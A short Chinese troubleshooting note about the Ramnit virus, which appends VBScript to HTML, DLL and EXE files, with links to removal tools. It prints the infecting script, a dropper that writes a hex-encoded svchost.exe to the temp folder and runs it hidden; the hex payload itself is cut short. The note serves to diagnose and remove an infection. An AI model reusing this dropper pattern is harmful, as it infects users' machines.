# HTML文件末尾被自动添加VBS的脚本
`【系统环境】windows 8`  
`【操作内容】html文件`  
`【解决方案验证次数】1次`  
## <i class="fa fa-question-circle"></i> 出现问题
html文件末尾被自动添加VBS脚本，开始还以为是编辑器添加的，后来在今日头条上看到介绍才知道是病毒。用360扫描，1W多个文件都被感染，包括DLL、HTML、EXE。打开迅雷的时候360就会报毒，原因是DLL文件被感染了。
```VBScript
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = "4D5A900003000000040000......................................."
Set FSO = CreateObject("Scripting.FileSystemObject")
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath)=False Then
Set FileObj = FSO.CreateTextFile(DropPath, True)
For i = 1 To Len(WriteData) Step 2
FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
Next
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
</SCRIPT>
```
## <i class="fa fa-bullseye"></i> 根本原因
【病毒名称】Virus.Win32.Ramnit.X  
【作用】感染HTML、DLL、EXE文件，在末尾添加一段VBS脚本，一旦运行就会交叉感染。仅破坏了文件，没有上传东西，也不会被盗号（已经几个月了我才发现），但具体的邪恶作用还未知，在网上也查不到相关研究内容。
## <i class="fa fa-check-circle"></i> 解决方法
使用<font color="#8baa4a">赛门铁克的专杀工具</font>的专杀工具清除病毒：   [官网下载](https://www.symantec.com/security-center/writeup/2015-022415-4725-99) |   [百度网盘下载](https://pan.baidu.com/s/1mhE0Zmo)（密码wrmn）  
使用<font color="#8baa4a">360</font>全盘防感染模式查杀
